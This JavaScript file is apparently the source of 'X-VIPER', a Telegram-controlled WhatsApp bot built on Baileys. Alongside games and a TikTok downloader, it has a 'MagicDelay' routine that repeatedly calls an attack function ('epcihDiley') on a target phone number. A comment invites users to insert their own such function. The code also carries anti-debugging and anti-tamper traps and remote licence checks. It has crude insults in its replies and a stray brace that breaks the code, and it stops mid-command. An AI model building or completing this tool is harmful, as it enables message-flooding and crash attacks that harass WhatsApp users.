const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./config");
const adminFile = './database/adminuser.json';
let adminUsers = []; // ✅ Tambahkan ini
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}
//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

//------------------(WAJIB DI ISI YAA)--------------------//
const thumbnailUrl = "https://files.catbox.moe/lfd4un.jpg";
const ThumbnailPairing = "https://files.catbox.moe/aaercl.jpg";
//-------------------------------------------------------------------------//
const databaseUrl = 'https://raw.githubusercontent.com/skaf873/database/refs/heads/main/tokens.json';

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(FILTER - BEBAS SPAM)--------------------//
async function MagicDelay(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3000; // ini delay ms nya serah mau berapaa rekomendasi udah tetep 3000 aja sih :)

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 3; i++) { // nih yang 3 itu lopp serah mau pake berapaa

    const loopStart = Date.now();

    try {
      await epcihDiley(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/3  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/3  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

//------------------(PREMIUM GROUP)--------------------//
// DB file auto dibuat
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

// --- helpers db ---
function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) {
      fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    }
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch {
    return { groups: [] };
  }
}

function savePremGroups(db) {
  fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2));
}

function isPremGroup(chatId) {
  const db = loadPremGroups();
  return db.groups.includes(Number(chatId));
}

function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}

function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Khusus owner.", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

// --- middleware: premium group gate (pakai buat command premium) ---
const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  }
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, {
      parse_mode: "HTML",
    });
  }
  return next();
};

// --- html escape biar aman ---
function escapeHtml(s = "") {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ================================
// POINT SYSTEM TIC TAC TOE
// ================================
const POINTS_FILE = path.join(__dirname, "points.json");

function loadPoints() {
  try {
    if (!fs.existsSync(POINTS_FILE)) {
      fs.writeFileSync(POINTS_FILE, JSON.stringify({}, null, 2));
    }
    const raw = fs.readFileSync(POINTS_FILE, "utf8");
    return JSON.parse(raw || "{}");
  } catch {
    return {};
  }
}

function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addWinPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 3;
  db[id].win += 1;
  savePoints(db);
}

function addLosePoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addDrawPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 1;
  db[id].draw += 1;
  savePoints(db);
}

function getUserPoint(userId) {
  const db = loadPoints();
  return db[String(userId)] || null;
}

function getLeaderboard(limit = 10) {
  const db = loadPoints();
  return Object.values(db)
    .sort((a, b) => b.points - a.points)
    .slice(0, limit);
}

// ================================
// TIC TAC TOE
// ================================
const tttGames = new Map(); // chatId -> game

function tttNewBoard() {
  return Array(9).fill(null);
}

function tttWinner(board) {
  const lines = [
    [0,1,2],[3,4,5],[6,7,8],
    [0,3,6],[1,4,7],[2,5,8],
    [0,4,8],[2,4,6]
  ];

  for (const [a, b, c] of lines) {
    if (board[a] && board[a] === board[b] && board[a] === board[c]) {
      return board[a];
    }
  }
  return null;
}

function tttDraw(board) {
  return board.every(v => v !== null) && !tttWinner(board);
}

function tttCell(v) {
  if (v === "X") return "❌";
  if (v === "O") return "⭕";
  return "➖";
}

function tttSafeName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function tttBoardKeyboard(chatId, gameId, board, locked = false) {
  const btn = (i) => ({
    text: tttCell(board[i]),
    callback_data: locked
      ? `tttnoop_${chatId}_${gameId}`
      : `tttmove_${chatId}_${gameId}_${i}`
  });

  return {
    inline_keyboard: [
      [btn(0), btn(1), btn(2)],
      [btn(3), btn(4), btn(5)],
      [btn(6), btn(7), btn(8)]
    ]
  };
}

function tttRender(game) {
  const xName = game.players.X ? tttSafeName(game.players.X) : "-";
  const oName = game.players.O ? tttSafeName(game.players.O) : "-";
  const turnUser = game.turn === "X" ? game.players.X : game.players.O;
  const turnName = turnUser ? tttSafeName(turnUser) : "-";

  return `🎮 <b>TIC TAC TOE</b>

❌ X : <b>${xName}</b>
⭕ O : <b>${oName}</b>

Giliran:
<b>${game.turn}</b> - ${turnName}`;
}

// ================================
// POINT SYSTEM SUIT BATU KERTAS 
// ================================
function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addSuitWin(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 2;
  db[id].win += 1;
  savePoints(db);
}

function addSuitLose(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addSuitDraw(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].draw += 1;
  savePoints(db);
}

// ================================
// SUIT GAME
// ================================
const suitGames = new Map(); // chatId -> game

function suitName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function suitChoiceLabel(choice) {
  if (choice === "rock") return "🪨 Batu";
  if (choice === "paper") return "📄 Kertas";
  if (choice === "scissors") return "✂️ Gunting";
  return "-";
}

function suitWin(a, b) {
  if (a === b) return "draw";
  if (
    (a === "rock" && b === "scissors") ||
    (a === "paper" && b === "rock") ||
    (a === "scissors" && b === "paper")
  ) return "p1";
  return "p2";
}

function suitPickKeyboard(chatId, gameId) {
  return {
    inline_keyboard: [
      [
        { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gameId}_rock` },
        { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gameId}_paper` },
        { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gameId}_scissors` }
      ]
    ]
  };
}

//---------(HANDLER BLOCK CMD ) ---------//
const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");

let blockedCommands = [];

function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const raw = fs.readFileSync(BLOCKCMD_FILE, "utf8");
      const parsed = JSON.parse(raw);

      if (Array.isArray(parsed)) {
        blockedCommands = parsed.map(cmd => String(cmd).toLowerCase().trim());
      } else {
        blockedCommands = [];
      }
    } else {
      blockedCommands = [];
    }
  } catch (err) {
    console.error("Gagal load blocked commands:", err.message);
    blockedCommands = [];
  }
}

function saveBlockedCommands() {
  try {
    fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2));
  } catch (err) {
    console.error("Gagal save blocked commands:", err.message);
  }
}

function normalizeCommandName(input) {
  return String(input || "")
    .trim()
    .toLowerCase()
    .replace(/^\//, "");
}

function isCommandBlocked(commandName) {
  const normalized = normalizeCommandName(commandName);
  return blockedCommands.includes(normalized);
}

loadBlockedCommands();

//---------(HANDLER APPROVED GB ) ---------//
const APPROVED_GROUPS_FILE = path.join(__dirname, "approved_groups.json");

let approvedGroups = [];
let pendingGroups = new Map();

function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_FILE)) {
      const raw = fs.readFileSync(APPROVED_GROUPS_FILE, "utf8");
      const parsed = JSON.parse(raw);
      approvedGroups = Array.isArray(parsed) ? parsed : [];
    } else {
      approvedGroups = [];
    }
  } catch (err) {
    console.error("Gagal load approved groups:", err.message);
    approvedGroups = [];
  }
}

function saveApprovedGroups() {
  try {
    fs.writeFileSync(APPROVED_GROUPS_FILE, JSON.stringify(approvedGroups, null, 2));
  } catch (err) {
    console.error("Gagal save approved groups:", err.message);
  }
}

function isOwner(userId) {
  return String(userId) === String(ownerID);
}

function isGroupApproved(chatId) {
  return approvedGroups.includes(String(chatId));
}

loadApprovedGroups();

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
    console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));

const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
    try {
        if (!m || !m.messages || !m.messages[0]) {
            return;
        }
        const msg = m.messages[0]; 
        const chatId = msg.key.remoteJid || "Tidak Diketahui";
        // (logika lain jika diperlukan)
    } catch (error) {
    }
});

// ✅ TAMBAHKAN KODE INI DI BAWAHNYA
sock.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update;
    if (action === 'add' && participants.includes(sock.user.id)) {
        console.log(`✅ Bot bergabung ke grup: ${id}`);
        try {
            await bot.telegram.sendMessage(
                ownerID,
                `✅ Bot bergabung ke grup:\n📌 JID: \`${id}\``,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {}
    }
});

sock.ev.on('creds.update', saveCreds);
store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ X-VIPER ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Sudah Terhubung
╘—————————————————═⬡
</pre></blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
            
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Sender Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));

        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addpairing", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addpairing 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234GINA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ X-VIPER ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status Bot : Belum Terhubung
╘═——————————————═⬡
</pre></blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(ThumbnailPairing, {
  caption: pairingMenu,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "SALIN CODE",
          copy_text: {
            text: formattedCode
          }
        }
      ]
    ]
  }
});

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ X-VIPER ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status Bot : Sudah Terhubung
╘═——————————————═⬡
</pre></blockquote>`;

      try {
        await bot.telegram.editMessageCaption(
  lastPairingMessage.chatId,
  lastPairingMessage.messageId,
  undefined,
  updateConnectionMenu,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "SALIN CODE",
            copy_text: {
              text: lastPairingMessage.pairingCode
            }
          }
        ]
      ]
    }
  }
);
      } catch (e) {
      }
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// ✅ Muat adminUsers di sini
adminUsers = loadJSON(adminFile);
// let adminUsers = loadJSON(adminFile);  // HAPUS

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
